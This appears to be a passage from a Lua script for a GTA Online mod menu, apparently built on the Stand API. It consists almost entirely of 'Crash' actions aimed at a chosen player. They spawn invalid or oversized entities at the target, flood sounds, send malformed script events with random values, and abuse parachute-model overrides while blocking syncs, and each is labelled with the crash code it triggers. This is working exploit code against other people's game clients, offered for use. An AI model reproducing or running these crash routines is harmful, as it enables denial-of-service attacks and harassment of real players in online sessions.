        entities.delete_by_handle(Spawned_Mike)
    
    end)

    menu.action(Crash, "Invalid model Crash", {"invalidmodel"}, "Will trigger 'XF' won't backfire", function()
    
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza1 = CreateObject(3613262246, TargetPlayerPos)
        local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
        local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
        local Object_pizza4 = CreateObject(-1348598835, TargetPlayerPos)
        for i = 0, 100 do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                false, true, true)
            util.yield(10)
        end
        util.yield(2000)
        entities.delete_by_handle(Object_pizza1)
        entities.delete_by_handle(Object_pizza2)
        entities.delete_by_handle(Object_pizza3)
        entities.delete_by_handle(Object_pizza4)
    
    end)


    menu.click_slider(Crash, "Sound Crash", {"sound"}, "Really unreliable won't backfire", 1, 2, 1, 1, function(on_change)
        if on_change == 1 then
            local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local time = util.current_time_millis() + 2000
            while time > util.current_time_millis() do
                local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
                for i = 1, 10 do
                    AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                        'MP_MISSION_COUNTDOWN_SOUNDSET', true, 10000, false)
                end
                util.yield()
            end
        end
        if on_change == 2 then
            local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local time = util.current_time_millis() + 1000
            while time > util.current_time_millis() do
                local pos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
                for i = 1, 20 do
                    AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Object_Dropped_Remote', pos.x, pos.y, pos.z,
                        'GTAO_FM_Events_Soundset', true, 10000, false)
                end
                util.yield()
            end
        end
    end)

    menu.action(Crash, "Ghost Crash", {"ghost"}, "Really unreliable won't backfire", function()
    
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
        local Spawned_tr3 = CreateVehicle(util.joaat("tr3"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed),
            true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_tr3, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(Spawned_tr3, false, 0)
        local Spawned_chernobog = CreateVehicle(util.joaat("chernobog"), SelfPlayerPos,
            ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_chernobog, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0,
            true)
        ENTITY.SET_ENTITY_VISIBLE(Spawned_chernobog, false, 0)
        local Spawned_avenger = CreateVehicle(util.joaat("avenger"), SelfPlayerPos,
            ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_avenger, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(Spawned_avenger, false, 0)
        for i = 0, 100 do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            ENTITY.SET_ENTITY_COORDS(SelfPlayerPed, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false
                , false)
            util.yield(10 * math.random())
            ENTITY.SET_ENTITY_COORDS(SelfPlayerPed, SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, true, false, false)
            util.yield(10 * math.random())
        end
    
    end)

    menu.action(Crash, "SE Crash", {"se"}, "Really unreliable won't backfire", function()
        util.trigger_script_event(1 << pid, { 962740265, PlayerID, 115831, 9999449 })
    end)

    menu.action(Crash, "Invalid Entity Crash", {}, "Really unreliable won't backfire", function()
    
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SpawnPed_slod_small_quadped = CreatePed(26, util.joaat("slod_small_quadped"), TargetPlayerPos,
            ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        local SpawnPed_slod_large_quadped = CreatePed(26, util.joaat("slod_large_quadped"), TargetPlayerPos,
            ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        local SpawnPed_slod_human = CreatePed(26, util.joaat("slod_human"), TargetPlayerPos,
            ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        util.yield(2000)
        entities.delete_by_handle(SpawnPed_slod_small_quadped)
        entities.delete_by_handle(SpawnPed_slod_large_quadped)
        entities.delete_by_handle(SpawnPed_slod_human)
    
    end)

    menu.action(Crash, "Invalid Object Crash", {"invalidobject"}, "Will trigger 'XF' won't backfire", function()
    
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza1 = CreateObject(3613262246, TargetPlayerPos)
        local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
        local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
        local Object_pizza4 = CreateObject(-1348598835, TargetPlayerPos)
        for i = 0, 100 do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                false, true, true)
            util.yield(10)
        end
        util.yield(2000)
        entities.delete_by_handle(Object_pizza1)
        entities.delete_by_handle(Object_pizza2)
        entities.delete_by_handle(Object_pizza3)
        entities.delete_by_handle(Object_pizza4)
    
    end)


    menu.action(Crash, "Hunter Crash", {"invalidhunter"}, "Really unreliable won't backfire", function()
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SpawnedVehicleList = {}

    for i = 1, 60 do
        TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        SpawnedVehicleList[i] = VEHICLE.CREATE_VEHICLE(util.joaat("hunter"), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true, false)
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList[i], true)
        ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList[i], false, 0)
        util.yield(50)
    end

    util.yield(5000)
    for i = 1, 60 do
        entities.delete_by_handle(SpawnedVehicleList[i])
    end
 end)


    menu.action(Crash, "Chernobog Crash", {"invalidcherobog2"}, "Really unreliable won't backfire", function()
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    TargetPlayerPos.y = TargetPlayerPos.y
    SpawnedVehicleList1 = {};

    for i = 1, 60 do
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
        SpawnedVehicleList1[i] = VEHICLE.CREATE_VEHICLE(util.joaat("chernobog"), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true, false)
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList1[i], true)
        ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList1[i], false, 0)
        util.yield(50)
    end

    util.yield(2000)
    for i = 1, 60 do
        entities.delete_by_handle(SpawnedVehicleList1[i])
    end

    util.yield(1000)
    SpawnedVehicleList2 = {};
    for i = 1, 50 do
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
        SpawnedVehicleList2[i] = VEHICLE.CREATE_VEHICLE(util.joaat("chernobog"), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true, false)
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList2[i], true)
        ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList2[i], false, 0)
        util.yield(50)
    end

    util.yield(2000)
    for i = 1, 50 do
        entities.delete_by_handle(SpawnedVehicleList2[i])
    end
end)


    menu.action(Crash, "Wade Crash", {"wade"}, "Really unreliable and can possibly backfire", function()
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SpawnPed_Wade = {}
        for i = 1, 40 do
            SpawnPed_Wade[i] = CreatePed(50, 0xDFE443E5, TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        end
        util.yield(10000)
        menu.trigger_commands("cleararea")
        end)


    menu.action(Crash, "Invalid Clothing Crash", {"invalidclothing"}, "Triggers 'XS' won't backfire", function()
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID();
        local Spawned_Mike = CreatePed(26, util.joaat("player_zero"), TargetPlayerPos,
            ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        for i = 0, 500 do
            PED.SET_PED_COMPONENT_VARIATION(Spawned_Mike, 0, 0, math.random(0, 10), 0)
            ENTITY.SET_ENTITY_COORDS(Spawned_Mike, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false,
                false, true);
            util.yield(10)
        end
        entities.delete_by_handle(Spawned_Mike)
    end)

    menu.action(Crash, "Trailer Crash", {"invalidtrailer"}, "Really unreliable most of the time it wont trigger anything", function()
    local function spawn_and_attach_vehicles(pid)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local targetHeading = ENTITY.GET_ENTITY_HEADING(TargetPlayerPed)

    local function spawn_vehicle(model, x_offset, y_offset)
    local pos = {
        x = TargetPlayerPos.x + x_offset,
        y = TargetPlayerPos.y + y_offset,
        z = TargetPlayerPos.z
    }
    local hash = util.joaat(model)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        util.yield(0)
    end
    local vehicle = VEHICLE.CREATE_VEHICLE(hash, pos.x, pos.y, pos.z, targetHeading, true, false)
    ENTITY.FREEZE_ENTITY_POSITION(vehicle, true)
    return vehicle
end

    SpawnedDune1 = spawn_vehicle("dune", 5, 0)
    SpawnedDune2 = spawn_vehicle("dune", 5, 5)
    SpawnedBarracks1 = spawn_vehicle("barracks", -5, 0)
    SpawnedBarracks2 = spawn_vehicle("barracks", -5, 5)
    SpawnedTowtruck = spawn_vehicle("towtruck2", 0, 0)
    SpawnedBarracks31 = spawn_vehicle("barracks3", 10, 0)
    SpawnedBarracks32 = spawn_vehicle("barracks3", 10, 5)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks31, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks32, SpawnedTowtruck, 0, 5, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks1, SpawnedTowtruck, 0, 10, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks2, SpawnedTowtruck, 0, 15, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune1, SpawnedTowtruck, 0, 20, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune2, SpawnedTowtruck, 0, 25, 0, 0, 0, 0, 0, true, true, true, false, 0, true)

     for i = 0, 100 do
            TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SpawnedTowtruck, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            util.yield(10)
        end

        util.yield(2000)

        entities.delete_by_handle(SpawnedTowtruck)
        entities.delete_by_handle(SpawnedDune1)
        entities.delete_by_handle(SpawnedDune2)
        entities.delete_by_handle(SpawnedBarracks31)
        entities.delete_by_handle(SpawnedBarracks32)
        entities.delete_by_handle(SpawnedBarracks1)
        entities.delete_by_handle(SpawnedBarracks2)
    end

    spawn_and_attach_vehicles(pid)

    end)

    menu.action(Crash, "Mother of nature v1", {"monv1"}, "Really unreliable will most of the time not trigger anything note that you will die", function()
        local user = players.user()
        local user_ped = players.user_ped()
        local pos = players.get_position(user)
        BlockSyncs(pid, function() -- blocking outgoing syncs to prevent the lobby from crashing :5head:
            util.yield(100)
            for i = 0, 110 do
                PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
                PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
                util.yield(50)
                PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
            end
            util.yield(250)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT) -- preventing wasted screen
            end
            ENTITY.SET_ENTITY_HEALTH(user_ped, 0) -- killing ped because it will still crash others until you die (clearing tasks doesnt seem to do much)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos, 0, false, false, 0)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
            menu.trigger_commands("invisibility off")
        end)
    end)

    menu.action(Crash, "Mother of nature v2", {"monv2"}, "Will trigger 'A2:521' won't backfire note that it does make you die", function()
        local user = players.user()
        local user_ped = players.user_ped()
        local pos = players.get_position(user)
        BlockSyncs(pid, function() 
            util.yield(100)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
            util.yield()
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
            util.yield(250)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
            util.yield(1000)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos, 0, false, false, 0)
        end)
    end)

    menu.action(Crash, "Child protection service", {"child"}, "Really unreliable will most of the time not trigger anything note that it will trigger stands entity spam", function()
    for count = 1, 40 do
        local mdl = util.joaat("a_c_poodle")
                BlockSyncs(pid, function() 
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
				util.yield(10)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0) 
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat("WEAPON_HOMINGLAUNCHER"), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
				util.yield(10)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
            else
                util.toast("Failed to load model. :/")
                end
            end)
        end
    end)

    menu.action(Crash, "Linus crash tips", {"linus"}, "Really unreliable will most of the time not trigger anything", function()
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 150 do
            util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        end
        util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
        end
        menu.trigger_commands("givesh " .. players.get_name(pid))
        util.yield(100)
        util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
        util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        end)
    
    local KrustyKrab = menu.list(Crash, "The Krusty Krab Special", {}, "")
    menu.divider(KrustyKrab, "The Krusty Krab Special")
    local peds = 5
    menu.slider(KrustyKrab, "Number of peds", {}, "", 1, 10, 5, 1, function(amount)
        peds = amount
    end)

    local crash_ents = {}
    local crash_toggle = false
    menu.toggle(KrustyKrab, "Do the funny", {"krusty"}, "Really unreliable will most of the time not trigger anything", function(val)
        crash_toggle = val
        BlockSyncs(pid, function()
            if val then
                local number_of_peds = peds
                local ped_mdl = util.joaat("ig_siemonyetarian")
                local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local ped_pos = players.get_position(pid)
                ped_pos.z += 3
                request_model(ped_mdl)
                for i = 1, number_of_peds do
                    local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                    crash_ents[i] = ped
                    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                    ENTITY.SET_ENTITY_VISIBLE(ped, false)
                end
                repeat
                    for k, ped in crash_ents do
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(ped, "PROP_HUMAN_BBQ", 0, false)
                    end
                    for k, v in entities.get_all_objects_as_pointers() do
                        if entities.get_model_hash(v) == util.joaat("prop_fish_slice_01") then
                            entities.delete_by_pointer(v)
                        end
                    end
                    util.yield_once()
                    util.yield_once()
                until not (crash_toggle and players.exists(pid))
                crash_toggle = false
                for k, obj in crash_ents do
                    entities.delete_by_handle(obj)
                end
                crash_ents = {}
            else
                for k, obj in crash_ents do
                    entities.delete_by_handle(obj)
                end
                crash_ents = {}
            end
        end)
    end)

    menu.action(Crash, "Fragment Crash", {"fragment"}, "Will trigger 'XJ' won't backfire", function()
        BlockSyncs(pid, function()
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            util.yield(1000)
            entities.delete_by_handle(object)
        end)
    end)

menu.action(Crash, "Bozo Crash", {"bozo"}, "Triggers 'XF' won't backfire", function()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(ped, true)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    local hash = 3613262246
    util.request_model(hash)
    local crash1 = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, coords['x'], coords['y'], coords['z'], true, false, false)
    ENTITY.SET_ENTITY_ROTATION(crash1, 0.0, -90.0, 0.0, 1, true)
    end)


menu.action(Crash, "Invalid Vehicle State", {"invalidvehicle"}, "Will trigger 'A2:521' won't backfire", function()
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(player, false)
    local my_pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local my_ped = PLAYER.GET_PLAYER_PED(players.user())
    pos.z = pos.z - 50

    BlockSyncs(pid, function()
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("otr")

        ENTITY.FREEZE_ENTITY_POSITION(my_ped, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, pos.x, pos.y, pos.z, false, false, false)
        util.yield()
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, #allvehicles do
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
        end
        util.yield()
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z, false, false, false)
        ENTITY.FREEZE_ENTITY_POSITION(my_ped, false)
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("otr")
    end)
end)
       menu.action(Crash, "Invalid Plane Task", {"invalidplane"}, "Will trigger 'A2:483' won't backfire", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = players.get_position(pid)
        local mdl = util.joaat("mp_m_freemode_01")
        local veh_mdl = util.joaat("t20")
        util.request_model(veh_mdl)
        util.request_model(mdl)
            BlockSyncs(pid, function()
            for i = 1, 10 do
                if not players.exists(pid) then
                    return
                end
               local veh = entities.create_vehicle(veh_mdl, pos, 0)
          
                local jesus = entities.create_ped(2, mdl, pos, 0)
                PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
                util.yield(100)
                TASK.TASK_PLANE_LAND(jesus, veh, ped, 10.0, 0, 10, 0, 0,0)  --A2
                util.yield(1000)
                entities.delete_by_handle(jesus)
                entities.delete_by_handle(veh)
            end
     
       STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    end)
    end) 
    menu.action(Crash, "Invalid Heli Task", {"invalidhelicopter"}, "Will trigger 'A2:456' won't backfire", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = players.get_position(pid)
        local mdl = util.joaat("mp_m_freemode_01")
        local veh_mdl = util.joaat("zentorno")
        util.request_model(veh_mdl)
        util.request_model(mdl)
            BlockSyncs(pid, function()
            for i = 1, 10 do
                if not players.exists(pid) then
                    return
                end
               local veh = entities.create_vehicle(veh_mdl, pos, 0)
          
                local jesus = entities.create_ped(2, mdl, pos, 0)
                PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
                util.yield(100)
                TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
                         
                util.yield(1000)
                entities.delete_by_handle(jesus)
               entities.delete_by_handle(veh)
            end
     
       STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    end)
    end)
            menu.action(Crash, "Invalid Submarine Task", {"invalidsubmarine"}, "Will trigger 'A0:457' won't backfire ", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = players.get_position(pid)
        local mdl = util.joaat("mp_m_freemode_01")
        local veh_mdl = util.joaat("adder")
        util.request_model(veh_mdl)
        util.request_model(mdl)
            BlockSyncs(pid, function()
            for i = 1, 10 do
                if not players.exists(pid) then
                    return
                end
               local veh = entities.create_vehicle(veh_mdl, pos, 0)
          
                local jesus = entities.create_ped(2, mdl, pos, 0)
                PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
                util.yield(100)
                TASK.TASK_SUBMARINE_GOTO_AND_STOP(1, veh, pos.x, pos.y, pos.z, 1)
                util.yield(1000)
                entities.delete_by_handle(jesus)
               entities.delete_by_handle(veh)
            end
     
       STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    end)
    end)
    menu.action(Crash, "Invalid Combat Task", {"invalidcombat"}, "Does not work really well, won't backfire", function()
           BlockSyncs(pid, function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local chop = util.joaat('a_c_rabbit_01')
        STREAMING.REQUEST_MODEL(chop)
        while not STREAMING.HAS_MODEL_LOADED(chop) do
            STREAMING.REQUEST_MODEL(chop)
            util.yield()
        end
        local achop = entities.create_ped(26, chop, c, 0) 
        WEAPON.GIVE_WEAPON_TO_PED(achop, util.joaat('weapon_grenade'), 9999, false, false)
        WEAPON.SET_CURRENT_PED_WEAPON(achop, util.joaat('weapon_grenade'),true)
        TASK.TASK_COMBAT_PED(achop , p, 0, 16)
        TASK.TASK_THROW_PROJECTILE(achop,c.x, c.y, c.z)
        local bchop = entities.create_ped(26, chop, c, 0) 
        WEAPON.GIVE_WEAPON_TO_PED(bchop, util.joaat('weapon_grenade'), 9999, false, false)
        WEAPON.SET_CURRENT_PED_WEAPON(bchop, util.joaat('weapon_grenade'),true)
        TASK.TASK_COMBAT_PED(bchop , p, 0, 16)
        TASK.TASK_THROW_PROJECTILE(bchop,c.x, c.y, c.z)
        util.yield(10000)
        util.toast("Crash done deleting peds")
        entities.delete_by_handle(bchop)
        entities.delete_by_handle(achop)
        if not STREAMING.HAS_MODEL_LOADED(chop) then
            util.toast("Couldn't load the model")
       end
   end)
end)


    menu.action(Crash, "Jesus Oppressor Crash", {"jesusoppressor"}, "Will trigger 'A2:456' won't backfire", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX((pid))
        local pos = ENTITY.GET_ENTITY_COORDS((pid))
        local mdl = util.joaat("u_m_m_jesus_01")
        local veh_mdl = util.joaat("oppressor")
        util.request_model(veh_mdl)
        util.request_model(mdl)
            local veh = entities.create_vehicle(veh_mdl, pos, 0)
            local jesus = entities.create_ped(2, mdl, pos, 0)
            PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
            util.yield(100)
            TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
            util.yield(1000)
            entities.delete_by_handle(jesus)
            entities.delete_by_handle(veh)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
        util.yield(5000)
    end)

        menu.action(Crash, "Yatchy V1", {"bigyachtyv1"}, "Crash event (A1:EA0FF6AD) sending prop yacht.", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_yacht_refproxy")
        local pos = players.get_position(pid)
        local oldPos = players.get_position(players.user())
        BlockSyncs(pid, function()
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0)
